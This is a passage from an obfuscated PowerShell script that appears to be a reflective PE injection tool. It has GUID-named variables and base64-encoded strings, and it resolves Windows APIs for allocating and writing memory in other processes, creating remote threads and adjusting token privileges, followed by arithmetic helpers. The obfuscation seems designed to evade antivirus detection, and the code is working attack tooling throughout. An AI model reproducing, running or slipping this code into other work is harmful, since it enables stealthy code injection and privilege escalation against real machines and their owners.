		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 12)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${ab85edbe2b604d979d7ef86780af9902}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${337378898d2e44cc83b4f3a63c0def59} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${337378898d2e44cc83b4f3a63c0def59}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 16)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${337378898d2e44cc83b4f3a63c0def59}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${31ca633cf8e74391864770b466c88270} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${31ca633cf8e74391864770b466c88270}
		return ${e39002e42e324234be4b9268daddc239}
	}
	Function Get-Win32Constants
	{
		${a851be47767a4e43b58c4498cda85d23} = New-Object System.Object
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		${a851be47767a4e43b58c4498cda85d23} | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return ${a851be47767a4e43b58c4498cda85d23}
	}
	Function Get-Win32Functions
	{
		${e68f649120fc4868841a2d8eea9e08f5} = New-Object System.Object
		${bc4f6682d1bb46bb84be38bb09afd4a2} = Get-ProcAddress kernel32.dll VirtualAlloc
		${3fe797918b6a4e9f8a559664fcb7ffe7} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${9493d23f36eb4c05a894de0610266f98} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${bc4f6682d1bb46bb84be38bb09afd4a2}, ${3fe797918b6a4e9f8a559664fcb7ffe7})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member NoteProperty -Name VirtualAlloc -Value ${9493d23f36eb4c05a894de0610266f98}
		${5e373c7625514ec88516b10346e44a88} = Get-ProcAddress kernel32.dll VirtualAllocEx
		${4bc9fa2b3617451eaef80be4d6d3ac34} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${f6161f96bedc4074b9bd5ead84146f76} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${5e373c7625514ec88516b10346e44a88}, ${4bc9fa2b3617451eaef80be4d6d3ac34})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member NoteProperty -Name VirtualAllocEx -Value ${f6161f96bedc4074b9bd5ead84146f76}
		${443a737337d74fc996ed88a46b61cf17} = Get-ProcAddress msvcrt.dll memcpy
		${49b9bf822e8e44e78faddd4f7d7de590} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${ec9256e51b7042ecb8af3b608ba0c64d} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${443a737337d74fc996ed88a46b61cf17}, ${49b9bf822e8e44e78faddd4f7d7de590})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name memcpy -Value ${ec9256e51b7042ecb8af3b608ba0c64d}
		${c5121f322e3e4957bea7648b156306af} = Get-ProcAddress msvcrt.dll memset
		${2802d652a09a4ac0a2491813b9db4633} = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${7f09c2f5d99f44a9821ed303e5415597} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c5121f322e3e4957bea7648b156306af}, ${2802d652a09a4ac0a2491813b9db4633})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name memset -Value ${7f09c2f5d99f44a9821ed303e5415597}
		${6ebe07e2ab664c34ac7f4bccafd89f11} = Get-ProcAddress kernel32.dll LoadLibraryA
		${00a99124a6534e1fbe0f317e463f8e08} = Get-DelegateType @([String]) ([IntPtr])
		${0ced629c7fa741cc958ca4de5ac9df24} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${6ebe07e2ab664c34ac7f4bccafd89f11}, ${00a99124a6534e1fbe0f317e463f8e08})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${0ced629c7fa741cc958ca4de5ac9df24}
		${864b0de0dd41414d9fb441dde3d2c82c} = Get-ProcAddress kernel32.dll GetProcAddress
		${428f8144d1374e1b9382feb4db4879f7} = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		${29977385ee5948fb90dc98d028bf9053} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${864b0de0dd41414d9fb441dde3d2c82c}, ${428f8144d1374e1b9382feb4db4879f7})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${29977385ee5948fb90dc98d028bf9053}
		${5e8d927094fc4786b3853e88742b762e} = Get-ProcAddress kernel32.dll GetProcAddress 
		${33041f9ad5834796a48e12ccddb1980b} = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		${6a55c25dd5b34cae873d4b299993f425} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${5e8d927094fc4786b3853e88742b762e}, ${33041f9ad5834796a48e12ccddb1980b})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value ${6a55c25dd5b34cae873d4b299993f425}
		${392752c03e034cd08ddce67f061bcd4f} = Get-ProcAddress kernel32.dll VirtualFree
		${720666f8b5514d05a8d78ec1033db35a} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${adb4899decb1461189d104d90e3c25d0} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${392752c03e034cd08ddce67f061bcd4f}, ${720666f8b5514d05a8d78ec1033db35a})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member NoteProperty -Name VirtualFree -Value ${adb4899decb1461189d104d90e3c25d0}
		${5aa46fc5f92a42e8b9d330613f6ee2e5} = Get-ProcAddress kernel32.dll VirtualFreeEx
		${f7835ab9c288415fa60e6d17ba14da2c} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${b519e3d9fde54f55b3574cfb3cc95c45} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${5aa46fc5f92a42e8b9d330613f6ee2e5}, ${f7835ab9c288415fa60e6d17ba14da2c})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member NoteProperty -Name VirtualFreeEx -Value ${b519e3d9fde54f55b3574cfb3cc95c45}
		${c8b8e04aa67d4a95b8721145aa31cd2f} = Get-ProcAddress kernel32.dll VirtualProtect
		${828b55e071b04ad5b81fb5bc449c452e} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${d3c6f78e935045cca8e78034e600f472} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c8b8e04aa67d4a95b8721145aa31cd2f}, ${828b55e071b04ad5b81fb5bc449c452e})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member NoteProperty -Name VirtualProtect -Value ${d3c6f78e935045cca8e78034e600f472}
		${aa76251583ee4c8ca5d9ed62ab2d9e7f} = Get-ProcAddress kernel32.dll GetModuleHandleA
		${abd5e093b96a478a99d38c4538feff65} = Get-DelegateType @([String]) ([IntPtr])
		${2e242b91c2be432ca3fc1d1f192dd1ba} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${aa76251583ee4c8ca5d9ed62ab2d9e7f}, ${abd5e093b96a478a99d38c4538feff65})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member NoteProperty -Name GetModuleHandle -Value ${2e242b91c2be432ca3fc1d1f192dd1ba}
		${60e9e2167c9542c4aa8e67152c7648b2} = Get-ProcAddress kernel32.dll FreeLibrary
		${d60a6d849a9b42ceb1100cd7020b2416} = Get-DelegateType @([Bool]) ([IntPtr])
		${ac39d723892548b8bbbe598c6ab67942} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${60e9e2167c9542c4aa8e67152c7648b2}, ${d60a6d849a9b42ceb1100cd7020b2416})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${ac39d723892548b8bbbe598c6ab67942}
		${5c5784b94f9e4f7f94f719668656debd} = Get-ProcAddress kernel32.dll OpenProcess
	    ${fb5d8b46d37443368ebddca73e7e0db2} = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${a0ba7cc50bfe4332b8e50f7e60394b2c} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${5c5784b94f9e4f7f94f719668656debd}, ${fb5d8b46d37443368ebddca73e7e0db2})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${a0ba7cc50bfe4332b8e50f7e60394b2c}
		${3d874f6455984137bb8cc6d79cfb5d64} = Get-ProcAddress kernel32.dll WaitForSingleObject
	    ${e4e3f0068319470fb01e05a929ef9a27} = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    ${ddf2526103274ad4b3c7c4c33b1b9dfe} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${3d874f6455984137bb8cc6d79cfb5d64}, ${e4e3f0068319470fb01e05a929ef9a27})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${ddf2526103274ad4b3c7c4c33b1b9dfe}
		${6aa3b0f0c3d04c0daf1fbdba9de967be} = Get-ProcAddress kernel32.dll WriteProcessMemory
        ${9f646812f484426ea695ebaba8118e43} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${718cc8e93784472185857aaf6e7036dd} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${6aa3b0f0c3d04c0daf1fbdba9de967be}, ${9f646812f484426ea695ebaba8118e43})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${718cc8e93784472185857aaf6e7036dd}
		${86f36e3efef94f108ecd39c07f2c3736} = Get-ProcAddress kernel32.dll ReadProcessMemory
        ${2f2f48d749374242a33b042a0b9bccd1} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${4c7ef71d2067404ba3a4b9220087245f} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${86f36e3efef94f108ecd39c07f2c3736}, ${2f2f48d749374242a33b042a0b9bccd1})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${4c7ef71d2067404ba3a4b9220087245f}
		${737fe777043e43e79bae36b3e3a6ccb0} = Get-ProcAddress kernel32.dll CreateRemoteThread
        ${b3c364956cf54dd29f1b551eff94e706} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${7b10639f925c407abd51e9b8a6ae6bc1} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${737fe777043e43e79bae36b3e3a6ccb0}, ${b3c364956cf54dd29f1b551eff94e706})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${7b10639f925c407abd51e9b8a6ae6bc1}
		${e82a7911bb024e46a6b06c3e2eb72d3a} = Get-ProcAddress kernel32.dll GetExitCodeThread
        ${1a5aed1955c245be8c79c4ebd2632abc} = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${b4387a380d114896a3b76e9be754e05f} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${e82a7911bb024e46a6b06c3e2eb72d3a}, ${1a5aed1955c245be8c79c4ebd2632abc})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${b4387a380d114896a3b76e9be754e05f}
		${c711165aa37748c396791f30194a8f0c} = Get-ProcAddress Advapi32.dll OpenThreadToken
        ${f3dbdd3afadd4820b7cbbd0f02249ed1} = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${8d289cc5696446a8b485ffdeceb76f09} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c711165aa37748c396791f30194a8f0c}, ${f3dbdd3afadd4820b7cbbd0f02249ed1})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${8d289cc5696446a8b485ffdeceb76f09}
		${ec7d7542f0584ba284f7996de578e0f6} = Get-ProcAddress kernel32.dll GetCurrentThread
        ${56490a7ce4794606a40b28fccaf5fe03} = Get-DelegateType @() ([IntPtr])
        ${01b2d5e7eb48496b884296668586e185} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ec7d7542f0584ba284f7996de578e0f6}, ${56490a7ce4794606a40b28fccaf5fe03})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${01b2d5e7eb48496b884296668586e185}
		${dc72db008d9b4cbc9df91bc592cb8484} = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        ${1e77bf01b26c4e59864aa10b73fdfe26} = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${04f4955ec26845cf9d9159a15530d9b5} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${dc72db008d9b4cbc9df91bc592cb8484}, ${1e77bf01b26c4e59864aa10b73fdfe26})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${04f4955ec26845cf9d9159a15530d9b5}
		${fafea0a30e5943888fc8a1b983adb291} = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        ${0678f4bf576545bf8ff446db3cbb33f8} = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        ${5725f7f8d4c54ea3a645d8e1d773cc1e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${fafea0a30e5943888fc8a1b983adb291}, ${0678f4bf576545bf8ff446db3cbb33f8})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${5725f7f8d4c54ea3a645d8e1d773cc1e}
		${dee053b498344371adf6fc093328932b} = Get-ProcAddress Advapi32.dll ImpersonateSelf
        ${1857074cce5046589d32a4b8f1f89980} = Get-DelegateType @([Int32]) ([Bool])
        ${d56662089da34b628199e3c278d68758} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${dee053b498344371adf6fc093328932b}, ${1857074cce5046589d32a4b8f1f89980})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${d56662089da34b628199e3c278d68758}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${ad7d92a82c714b46be5372613e6ee164} = Get-ProcAddress NtDll.dll NtCreateThreadEx
            ${1f9c6a6f803a4945bd4907d658eedfd0} = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${1b1fda372c8c4ec8b65c3822ad33a67e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ad7d92a82c714b46be5372613e6ee164}, ${1f9c6a6f803a4945bd4907d658eedfd0})
		    ${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${1b1fda372c8c4ec8b65c3822ad33a67e}
        }
		${91767d65e68c471b959b480184c30f2d} = Get-ProcAddress Kernel32.dll IsWow64Process
        ${db16c7b6000342508dd6cbb949a47686} = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${8407926e518245e2896d780056a39431} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${91767d65e68c471b959b480184c30f2d}, ${db16c7b6000342508dd6cbb949a47686})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${8407926e518245e2896d780056a39431}
		${92d153a20e8940baa1a688a780d4f6bf} = Get-ProcAddress Kernel32.dll CreateThread
        ${13eceb88c8b5434abaaf600c37288501} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${5e75560622be4c66b7ce50dcd8b25385} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${92d153a20e8940baa1a688a780d4f6bf}, ${13eceb88c8b5434abaaf600c37288501})
		${e68f649120fc4868841a2d8eea9e08f5} | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${5e75560622be4c66b7ce50dcd8b25385}
		return ${e68f649120fc4868841a2d8eea9e08f5}
	}
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${b5d6f445e7224a3498735b4ad7907d04},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${db9484250a03479a823ca11ef9b3a3d0}
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes(${b5d6f445e7224a3498735b4ad7907d04})
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes(${db9484250a03479a823ca11ef9b3a3d0})
		[Byte[]]${4a093e5aaf2646578cdf648bae7bc823} = [BitConverter]::GetBytes([UInt64]0)
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			${b023f89e6b3146879760609586e65ab0} = 0
			for (${9282212b31e84e3ca7221e3fcd69f077} = 0; ${9282212b31e84e3ca7221e3fcd69f077} -lt $Value1Bytes.Count; ${9282212b31e84e3ca7221e3fcd69f077}++)
			{
				${8101fda2932b4d70a27886d490bf35dc} = $Value1Bytes[${9282212b31e84e3ca7221e3fcd69f077}] - ${b023f89e6b3146879760609586e65ab0}
				if (${8101fda2932b4d70a27886d490bf35dc} -lt $Value2Bytes[${9282212b31e84e3ca7221e3fcd69f077}])
				{
					${8101fda2932b4d70a27886d490bf35dc} += 256
					${b023f89e6b3146879760609586e65ab0} = 1
				}
				else
				{
					${b023f89e6b3146879760609586e65ab0} = 0
				}
				[UInt16]$Sum = ${8101fda2932b4d70a27886d490bf35dc} - $Value2Bytes[${9282212b31e84e3ca7221e3fcd69f077}]
				${4a093e5aaf2646578cdf648bae7bc823}[${9282212b31e84e3ca7221e3fcd69f077}] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${4a093e5aaf2646578cdf648bae7bc823}, 0)
	}
	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${b5d6f445e7224a3498735b4ad7907d04},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${db9484250a03479a823ca11ef9b3a3d0}
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes(${b5d6f445e7224a3498735b4ad7907d04})
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes(${db9484250a03479a823ca11ef9b3a3d0})
		[Byte[]]${4a093e5aaf2646578cdf648bae7bc823} = [BitConverter]::GetBytes([UInt64]0)
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			${b023f89e6b3146879760609586e65ab0} = 0
			for (${9282212b31e84e3ca7221e3fcd69f077} = 0; ${9282212b31e84e3ca7221e3fcd69f077} -lt $Value1Bytes.Count; ${9282212b31e84e3ca7221e3fcd69f077}++)
			{
				[UInt16]$Sum = $Value1Bytes[${9282212b31e84e3ca7221e3fcd69f077}] + $Value2Bytes[${9282212b31e84e3ca7221e3fcd69f077}] + ${b023f89e6b3146879760609586e65ab0}
				${4a093e5aaf2646578cdf648bae7bc823}[${9282212b31e84e3ca7221e3fcd69f077}] = $Sum -band 0x00FF
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					${b023f89e6b3146879760609586e65ab0} = 1
				}
				else
				{
					${b023f89e6b3146879760609586e65ab0} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${4a093e5aaf2646578cdf648bae7bc823}, 0)
	}
	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${b5d6f445e7224a3498735b4ad7907d04},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${db9484250a03479a823ca11ef9b3a3d0}
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes(${b5d6f445e7224a3498735b4ad7907d04})
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes(${db9484250a03479a823ca11ef9b3a3d0})
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for (${9282212b31e84e3ca7221e3fcd69f077} = $Value1Bytes.Count-1; ${9282212b31e84e3ca7221e3fcd69f077} -ge 0; ${9282212b31e84e3ca7221e3fcd69f077}--)
			{
				if ($Value1Bytes[${9282212b31e84e3ca7221e3fcd69f077}] -gt $Value2Bytes[${9282212b31e84e3ca7221e3fcd69f077}])
				{
					return $true
				}
				elseif ($Value1Bytes[${9282212b31e84e3ca7221e3fcd69f077}] -lt $Value2Bytes[${9282212b31e84e3ca7221e3fcd69f077}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		${d224ba1010334e1da6c79c98346c2f99}
		)
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes(${d224ba1010334e1da6c79c98346c2f99})
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        ${d224ba1010334e1da6c79c98346c2f99} 
        )
